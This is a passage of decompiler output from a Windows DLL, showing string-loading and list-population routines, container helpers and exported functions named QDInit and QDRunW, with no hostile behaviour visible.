  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v72 = (_BYTE *)dword_101842F4;
  v73 = dword_101842F4 + 198;
  *(_BYTE *)(dword_101842F4 + 300) = 0;
  v72[301] = 0;
  v72[302] = 0;
  v72[303] = 0;
  v72[304] = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v73 + 52))(v73);
  v74 = (wchar_t *)sub_1000CC40((int)&unk_1017CFA0);
  sub_1000D17D(&v119, v74);
  LOBYTE(v127) = 81;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v75 = (wchar_t *)sub_1000CC40((int)&unk_1017CFE0);
  sub_1000D17D(&v119, v75);
  LOBYTE(v127) = 82;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v76 = (wchar_t *)sub_1000CC40((int)&unk_1017D020);
  sub_1000D17D(&v119, v76);
  LOBYTE(v127) = 83;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v77 = (wchar_t *)sub_1000CC40((int)&unk_1017D060);
  sub_1000D17D(&v119, v77);
  LOBYTE(v127) = 84;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v78 = (wchar_t *)sub_1000CC40((int)&unk_1017D0A0);
  sub_1000D17D(&v119, v78);
  LOBYTE(v127) = 85;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v79 = (wchar_t *)sub_1000CC40((int)&unk_1017D0E0);
  sub_1000D17D(&v119, v79);
  LOBYTE(v127) = 86;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v80 = (wchar_t *)sub_1000CC40((int)&unk_1017D120);
  sub_1000D17D(&v119, v80);
  LOBYTE(v127) = 87;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v81 = (wchar_t *)sub_1000CC40((int)&unk_1017D198);
  sub_1000D17D(&v119, v81);
  LOBYTE(v127) = 88;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v82 = (wchar_t *)sub_1000CC40((int)&unk_1017D1D8);
  sub_1000D17D(&v119, v82);
  LOBYTE(v127) = 89;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v83 = (wchar_t *)sub_1000CC40((int)&unk_1017D15C);
  sub_1000D17D(&v119, v83);
  LOBYTE(v127) = 90;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v84 = (wchar_t *)sub_1000CC40((int)&unk_1017D218);
  sub_1000D17D(&v119, v84);
  LOBYTE(v127) = 91;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v85 = (wchar_t *)sub_1000CC40((int)&unk_1017D258);
  sub_1000D17D(&v119, v85);
  LOBYTE(v127) = 92;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v86 = (wchar_t *)sub_1000CC40((int)&unk_1017D2D0);
  sub_1000D17D(&v119, v86);
  LOBYTE(v127) = 93;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v87 = (wchar_t *)sub_1000CC40((int)&unk_1017D310);
  sub_1000D17D(&v119, v87);
  LOBYTE(v127) = 94;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v88 = (wchar_t *)sub_1000CC40((int)&unk_1017D358);
  sub_1000D17D(&v119, v88);
  LOBYTE(v127) = 95;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v89 = (wchar_t *)sub_1000CC40((int)&unk_1017D3A8);
  sub_1000D17D(&v119, v89);
  LOBYTE(v127) = 96;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v90 = (wchar_t *)sub_1000CC40((int)&unk_1017D3E8);
  sub_1000D17D(&v119, v90);
  LOBYTE(v127) = 97;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v91 = (wchar_t *)sub_1000CC40((int)&unk_1017D294);
  sub_1000D17D(&v119, v91);
  LOBYTE(v127) = 98;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 198) + 36))(dword_101842F4 + 198, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  (*(void (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 108) + 52))(dword_101842F4 + 108);
  v92 = (wchar_t *)sub_1000CC40((int)&unk_1017D428);
  sub_1000D17D(&v119, v92);
  LOBYTE(v127) = 99;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v93 = (wchar_t *)sub_1000CC40((int)&unk_1017D468);
  sub_1000D17D(&v119, v93);
  LOBYTE(v127) = 100;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v94 = (wchar_t *)sub_1000CC40((int)&unk_1017D4A8);
  sub_1000D17D(&v119, v94);
  LOBYTE(v127) = 101;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v95 = (wchar_t *)sub_1000CC40((int)&unk_1017D508);
  sub_1000D17D(&v119, v95);
  LOBYTE(v127) = 102;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v96 = (wchar_t *)sub_1000CC40((int)&unk_1017D548);
  sub_1000D17D(&v119, v96);
  LOBYTE(v127) = 103;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v97 = (wchar_t *)sub_1000CC40((int)&unk_1017D59C);
  sub_1000D17D(&v119, v97);
  LOBYTE(v127) = 104;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v98 = (wchar_t *)sub_1000CC40((int)&unk_1017D5D4);
  sub_1000D17D(&v119, v98);
  LOBYTE(v127) = 105;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v99 = (wchar_t *)sub_1000CC40((int)&unk_1017D610);
  sub_1000D17D(&v119, v99);
  LOBYTE(v127) = 106;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v100 = (wchar_t *)sub_1000CC40((int)&unk_1017D650);
  sub_1000D17D(&v119, v100);
  LOBYTE(v127) = 107;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v101 = (wchar_t *)sub_1000CC40((int)&unk_1017D690);
  sub_1000D17D(&v119, v101);
  LOBYTE(v127) = 108;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v102 = (wchar_t *)sub_1000CC40((int)&unk_1017D6CC);
  sub_1000D17D(&v119, v102);
  LOBYTE(v127) = 109;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v103 = (wchar_t *)sub_1000CC40((int)&unk_1017D708);
  sub_1000D17D(&v119, v103);
  LOBYTE(v127) = 110;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v104 = (wchar_t *)sub_1000CC40((int)&unk_1017D744);
  sub_1000D17D(&v119, v104);
  LOBYTE(v127) = 111;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v105 = (wchar_t *)sub_1000CC40((int)&unk_1017D77C);
  sub_1000D17D(&v119, v105);
  LOBYTE(v127) = 112;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v106 = (wchar_t *)sub_1000CC40((int)&unk_1017D7BC);
  sub_1000D17D(&v119, v106);
  LOBYTE(v127) = 113;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v107 = (wchar_t *)sub_1000CC40((int)&unk_1017D7F8);
  sub_1000D17D(&v119, v107);
  LOBYTE(v127) = 114;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v108 = (wchar_t *)sub_1000CC40((int)&unk_1017D834);
  sub_1000D17D(&v119, v108);
  LOBYTE(v127) = 115;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v109 = (wchar_t *)sub_1000CC40((int)&unk_1017D870);
  sub_1000D17D(&v119, v109);
  LOBYTE(v127) = 116;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v110 = (wchar_t *)sub_1000CC40((int)&unk_1017D8B0);
  sub_1000D17D(&v119, v110);
  LOBYTE(v127) = 117;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v111 = (wchar_t *)sub_1000CC40((int)&unk_1017D8E8);
  sub_1000D17D(&v119, v111);
  LOBYTE(v127) = 118;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v112 = (wchar_t *)sub_1000CC40((int)&unk_1017D928);
  sub_1000D17D(&v119, v112);
  LOBYTE(v127) = 119;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v113 = (wchar_t *)sub_1000CC40((int)&unk_1017D970);
  sub_1000D17D(&v119, v113);
  LOBYTE(v127) = 120;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v114 = (wchar_t *)sub_1000CC40((int)&unk_1017D9B4);
  sub_1000D17D(&v119, v114);
  LOBYTE(v127) = 121;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v115 = (wchar_t *)sub_1000CC40((int)&unk_1017D9F4);
  sub_1000D17D(&v119, v115);
  LOBYTE(v127) = 122;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v116 = (wchar_t *)sub_1000CC40((int)&unk_1017DA38);
  sub_1000D17D(&v119, v116);
  LOBYTE(v127) = 123;
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 108) + 36))(dword_101842F4 + 108, &v119);
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  *(_DWORD *)(dword_101842F4 + 178) = 50013;
  v117 = (wchar_t *)sub_1000CC40((int)&unk_1017DA7C);
  sub_1000D17D(&v119, v117);
  LOBYTE(v127) = 124;
  sub_10001236(v120, (LONG *)(dword_101842F4 + 12));
  LOBYTE(v127) = 53;
  sub_1000D3AD(&v119);
  v118 = dword_101842F4;
  *(_DWORD *)(dword_101842F4 + 341) = -1073741824;
  *(_DWORD *)(v118 + 345) = 3;
  v127 = -1;
  sub_10003111(&v123);
}
// 101832B0: using guessed type int dword_101832B0;
// 101832B4: using guessed type int dword_101832B4;
// 101832B8: using guessed type _DWORD dword_101832B8[2];
// 101832C0: using guessed type int dword_101832C0;
// 101832C4: using guessed type int dword_101832C4;
// 101832C8: using guessed type _DWORD dword_101832C8[2];
// 101832D0: using guessed type _DWORD dword_101832D0[2];
// 101832D8: using guessed type _DWORD dword_101832D8[2];
// 101832E0: using guessed type _DWORD dword_101832E0[3];
// 101832EC: using guessed type _DWORD dword_101832EC[4];
// 101832FC: using guessed type _DWORD dword_101832FC[4];
// 1018330C: using guessed type _DWORD dword_1018330C[4];
// 1018331C: using guessed type _DWORD dword_1018331C[4];
// 1018332C: using guessed type _DWORD dword_1018332C[4];
// 1018333C: using guessed type _DWORD dword_1018333C[4];
// 10183352: using guessed type _DWORD dword_10183352[4];
// 10183366: using guessed type _DWORD dword_10183366[4];
// 10183376: using guessed type _DWORD dword_10183376[4];
// 10183393: using guessed type _DWORD dword_10183393[4];
// 101833A3: using guessed type _BYTE byte_101833A3[25];
// 101833BC: using guessed type _DWORD dword_101833BC[4];
// 101833CC: using guessed type _DWORD dword_101833CC[4];
// 101833F1: using guessed type _DWORD dword_101833F1[4];
// 1018340E: using guessed type _DWORD dword_1018340E[4];
// 10183427: using guessed type _DWORD dword_10183427[4];
// 101842F4: using guessed type int dword_101842F4;
// 10193B2C: using guessed type int dword_10193B2C;

//----- (10004EEB) --------------------------------------------------------
char __cdecl sub_10004EEB(int a1)
{
  _DWORD *v1; // eax
  int v2; // eax
  int v3; // ecx
  void *v4; // esi
  void **v5; // eax
  char v6; // bl
  int v8; // [esp-8h] [ebp-58h] BYREF
  int v9; // [esp-4h] [ebp-54h]
  void *v10; // [esp+Ch] [ebp-44h]
  int v11[2]; // [esp+10h] [ebp-40h] BYREF
  char v12[8]; // [esp+18h] [ebp-38h] BYREF
  int v13; // [esp+20h] [ebp-30h]
  int v14[6]; // [esp+2Ch] [ebp-24h] BYREF
  int v15; // [esp+4Ch] [ebp-4h]

  v1 = sub_1000D372(v11, a1);
  v15 = 0;
  v2 = sub_1000E111((int)v1);
  v9 = v3;
  v8 = v3;
  v10 = &v8;
  sub_1000D372(&v8, v2);
  LOBYTE(v15) = 0;
  sub_1001187B((int)v12, v8, v9);
  LOBYTE(v15) = 3;
  sub_1000D3AD(v11);
  (*(void (__thiscall **)(int, _DWORD, _DWORD, int))(*(_DWORD *)v13 + 68))(v13, 0, 0, 2);
  v4 = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)v13 + 72))(v13);
  (*(void (__thiscall **)(int, _DWORD, _DWORD, _DWORD))(*(_DWORD *)v13 + 68))(v13, 0, 0, 0);
  sub_1000B1F3(v4, (int)v14, 0);
  LOBYTE(v15) = 4;
  sub_10011746(v12, v14);
  v5 = (void **)sub_1000B4B8(v14);
  v6 = sub_100016E6(v5);
  LOBYTE(v15) = 3;
  sub_1000B3DF(v14);
  v15 = -1;
  sub_100119B4(v12);
  return v6;
}
// 10004F24: variable 'v3' is possibly undefined

//----- (10004FDB) --------------------------------------------------------
int SetObjectDescriptor()
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10003155();
  sub_100013CC();
  return 1;
}

//----- (1000501E) --------------------------------------------------------
int __cdecl QDInit(void **a1)
{
  int v2; // [esp+0h] [ebp-2Ch] BYREF
  void (__cdecl *v3[5])(unsigned int, struct _EXCEPTION_POINTERS *); // [esp+Ch] [ebp-20h] BYREF
  int v4; // [esp+28h] [ebp-4h]

  v3[4] = (void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *))&v2;
  sub_1000EA57((int)v3);
  v4 = 0;
  sub_1000E73C();
  LOBYTE(v4) = 1;
  if ( sub_100016E6(a1) )
  {
    sub_100013CC();
    v4 = -1;
    sub_1000EA95(v3);
    return 1;
  }
  else
  {
    v4 = -1;
    sub_1000EA95(v3);
    return 0;
  }
}

//----- (100050B2) --------------------------------------------------------
void (__cdecl *__stdcall QDRunW(int a1, int a2, wchar_t *String, int a4))(unsigned int, struct _EXCEPTION_POINTERS *)
{
  bool v4; // bl
  int v6; // [esp+0h] [ebp-30h] BYREF
  void (__cdecl *v7[3])(unsigned int, struct _EXCEPTION_POINTERS *); // [esp+Ch] [ebp-24h] BYREF
  int v8[3]; // [esp+18h] [ebp-18h] BYREF
  int v9; // [esp+2Ch] [ebp-4h]

  v8[2] = (int)&v6;
  sub_1000EA57((int)v7);
  v9 = 0;
  sub_1000E73C();
  LOBYTE(v9) = 1;
  sub_1000D17D(v8, String);
  LOBYTE(v9) = 2;
  v4 = sub_10004EEB((int)v8) == 0;
  LOBYTE(v9) = 1;
  sub_1000D3AD(v8);
  if ( !v4 )
    sub_100013CC();
  v9 = -1;
  return sub_1000EA95(v7);
}
// 100050B2: using guessed type void (__cdecl *var_24[3])(unsigned int, struct _EXCEPTION_POINTERS *);

//----- (10005138) --------------------------------------------------------
_DWORD *__thiscall sub_10005138(void *this, _DWORD *a2)
{
  _DWORD *v3; // esi
  int v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v3[1] = this;
    *v3 = &off_100FC1B4;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_1000728E(a2, (int)v3);
  return a2;
}
// 100FC1B4: using guessed type int (__thiscall *off_100FC1B4)(void *Block, char);

//----- (100051A2) --------------------------------------------------------
_DWORD *__thiscall sub_100051A2(void *this, _DWORD *a2, _DWORD *a3)
{
  unsigned int v4; // eax
  _DWORD *v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  v5 = a3;
  if ( (unsigned int)a3 > v4 )
  {
    v6 = sub_1000E8EF(&a3);
    sub_100078FE((int)v6);
  }
  v7 = operator new(0xCu);
  a3 = v7;
  if ( v7 )
  {
    v7[1] = this;
    *v7 = &off_100FC1B4;
    v7[2] = v5;
  }
  else
  {
    v7 = 0;
  }
  sub_1000728E(a2, (int)v7);
  return a2;
}
// 100FC1B4: using guessed type int (__thiscall *off_100FC1B4)(void *Block, char);

//----- (1000522C) --------------------------------------------------------
void __thiscall sub_1000522C(int *this)
{
  *this = (int)off_100FBFBC;
  sub_1000D3AD(this + 1);
}
// 100FBFBC: using guessed type int (__thiscall *off_100FBFBC[2])(void *, char);

//----- (10005258) --------------------------------------------------------
void *__thiscall sub_10005258(_DWORD *this)
{
  *this = &off_100FC07C;
  sub_1000730D(this + 1);
  return sub_100059B5(this);
}
// 100FC07C: using guessed type int (__thiscall *off_100FC07C)(void *Block, char);

//----- (10005293) --------------------------------------------------------
int __thiscall sub_10005293(_DWORD *this)
{
  return this[5];
}

//----- (10005297) --------------------------------------------------------
bool __thiscall sub_10005297(void *this, void *a2)
{
  int *v2; // eax
  bool v3; // bl
  void *v5[2]; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v2 = sub_10005D78(a2, (int)this, (int *)v5);
  v6 = 0;
  v3 = (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)*v2 + 4))(*v2) == 0;
  v6 = -1;
  sub_10007D7A(v5);
  return v3;
}

//----- (100052E1) --------------------------------------------------------
char __thiscall sub_100052E1(_DWORD *this, void *a2)
{
  char v3; // bl
  int v5[3]; // [esp+8h] [ebp-18h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  sub_10005CC1(a2, (int)this, v5);
  v3 = 0;
  v6 = 0;
  if ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    (*(void (__thiscall **)(int))(*(_DWORD *)v5[0] + 24))(v5[0]);
    --this[5];
    v3 = 1;
  }
  v6 = -1;
  sub_1000780D(v5);
  return v3;
}

//----- (10005357) --------------------------------------------------------
int __thiscall sub_10005357(void *this, void *a2)
{
  _DWORD *v2; // eax
  int v3; // esi
  int v5; // [esp+4h] [ebp-1Ch] BYREF
  void *v6[3]; // [esp+8h] [ebp-18h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  sub_10005D78(a2, (int)this, (int *)v6);
  v7 = 0;
  if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v6[0] + 4))(v6[0]) )
  {
    v2 = sub_1000E8EF(&v5);
    LOBYTE(v7) = 1;
    sub_100078FE((int)v2);
  }
  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)v6[0] + 12))(v6[0]) + 12;
  v7 = -1;
  sub_10007D7A(v6);
  return v3;
}

//----- (100053DE) --------------------------------------------------------
int __thiscall sub_100053DE(void *this, int a2)
{
  _DWORD *v3; // eax
  int v4; // esi
  _DWORD v6[4]; // [esp+4h] [ebp-1Ch] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  v3 = sub_10007972(v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(void *, int, _DWORD *, _DWORD))(*(_DWORD *)this + 48))(this, a2, v3, 0);
  v7 = -1;
  sub_100079EC((int)v6);
  return v4;
}
// 100053DE: using guessed type _DWORD var_1C[4];

//----- (10005427) --------------------------------------------------------
void *__thiscall sub_10005427(void *this, int a2, _DWORD *a3)
{
  _DWORD v5[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v6; // [esp+20h] [ebp-4h]

  sub_1000791E(a3, v5);
  v6 = 0;
  (*(void (__thiscall **)(void *, int, _DWORD *, int))(*(_DWORD *)this + 48))(this, a2, v5, 1);
  v6 = -1;
  return sub_100079EC((int)v5);
}
// 10005427: using guessed type _DWORD var_1C[4];

//----- (10005474) --------------------------------------------------------
void __fastcall sub_10005474(int a1, int a2)
{
  sub_10005BE1(0x10u, a2, a1);
}

//----- (1000547E) --------------------------------------------------------
_DWORD *__thiscall sub_1000547E(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // esi

  v3 = operator new(0x10u);
  v4 = (int)v3;
  if ( v3 )
  {
    v3[1] = this;
    *v3 = &off_100FC154;
    (*(void (__thiscall **)(void *, _DWORD *))(*(_DWORD *)this + 44))(this, v3 + 2);
  }
  else
  {
    v4 = 0;
  }
  sub_1000728E(a2, v4);
  return a2;
}
// 100FC154: using guessed type int (__stdcall *off_100FC154)(char);

//----- (100054EC) --------------------------------------------------------
_DWORD *__thiscall sub_100054EC(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x10u);
  v4 = v3;
  if ( v3 )
  {
    v3[1] = this;
    *v3 = &off_100FC174;
    (*(void (__thiscall **)(void *, _DWORD *))(*(_DWORD *)this + 44))(this, v3 + 2);
  }
  else
  {
    v4 = 0;
  }
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}
// 100FC174: using guessed type int (__stdcall *off_100FC174)(char);

//----- (10005579) --------------------------------------------------------
_DWORD *__thiscall sub_10005579(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x18u);
  if ( v3 )
    v4 = sub_10005FC1(v3, (int)this);
  else
    v4 = 0;
  sub_1000728E(a2, (int)v4);
  return a2;
}

//----- (100055D3) --------------------------------------------------------
int __thiscall sub_100055D3(_DWORD *this, void *a2, _DWORD *a3, char a4)
{
  unsigned int v5; // ebx
  unsigned int v6; // eax
  int v7; // eax
  _DWORD *v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // esi
  int v13; // [esp+10h] [ebp-40h]
  int v14[2]; // [esp+14h] [ebp-3Ch] BYREF
  int v15[2]; // [esp+1Ch] [ebp-34h] BYREF
  int (__thiscall **v16)(void *, char); // [esp+24h] [ebp-2Ch] BYREF
  int v17; // [esp+28h] [ebp-28h] BYREF
  int v18[5]; // [esp+30h] [ebp-20h] BYREF
  int v19; // [esp+4Ch] [ebp-4h]

  sub_10005CC1(a2, (int)this, v14);
  v19 = 0;
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v14[0] + 4))(v14[0]) )
  {
    v5 = this[5];
    if ( v5 / (*(int (__thiscall **)(_DWORD *))(this[1] + 4))(this + 1) >= 3 )
    {
      sub_10005C4A(this, 2 * v5);
      v13 = this[1];
      v6 = sub_10005E2F((int)a2, (int)this);
      v7 = (*(int (__thiscall **)(_DWORD *, unsigned int))(v13 + 44))(this + 1, v6);
      v8 = (_DWORD *)(*(int (__thiscall **)(int, int *))(*(_DWORD *)v7 + 20))(v7, v15);
      LOBYTE(v19) = 1;
      sub_1000A219(v14, v8);
      LOBYTE(v19) = 0;
      sub_1000780D(v15);
    }
    ++this[5];
    v16 = &off_100FC0B0;
    sub_1000D372(&v17, (int)a2);
    LOBYTE(v19) = 2;
    sub_1000791E(a3, v18);
    LOBYTE(v19) = 4;
    (*(void (__thiscall **)(int, int (__thiscall ***)(void *, char)))(*(_DWORD *)v14[0] + 28))(v14[0], &v16);
    LOBYTE(v19) = 0;
    sub_10005EB3((int *)&v16);
    sub_10006682(v9, v14[0]);
  }
  else if ( a4 )
  {
    v10 = (*(int (__thiscall **)(int))(*(_DWORD *)v14[0] + 12))(v14[0]);
    (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)(v10 + 12) + 56))(v10 + 12, a3);
  }
  v11 = (*(int (__thiscall **)(int))(*(_DWORD *)v14[0] + 12))(v14[0]) + 12;
  v19 = -1;
  sub_1000780D(v14);
  return v11;
}
// 100056D1: variable 'v9' is possibly undefined
// 100FC0B0: using guessed type int (__thiscall *off_100FC0B0)(void *Block, char);
// 100055D3: using guessed type int var_20[5];

//----- (10005722) --------------------------------------------------------
BOOL __thiscall sub_10005722(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1000572D) --------------------------------------------------------
_DWORD *__thiscall sub_1000572D(void *this, _DWORD *a2, void *Block)
{
  unsigned int v4; // eax
  void *v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  v5 = Block;
  if ( (unsigned int)Block > v4 )
  {
    v6 = sub_1000E8EF(&Block);
    sub_100078FE((int)v6);
  }
  v7 = operator new(0xCu);
  Block = v7;
  if ( v7 )
  {
    v7[1] = this;
    *v7 = &off_100FC1B4;
    v7[2] = v5;
  }
  else
  {
    v7 = 0;
  }
  sub_1000728E(a2, (int)v7);
  return a2;
}
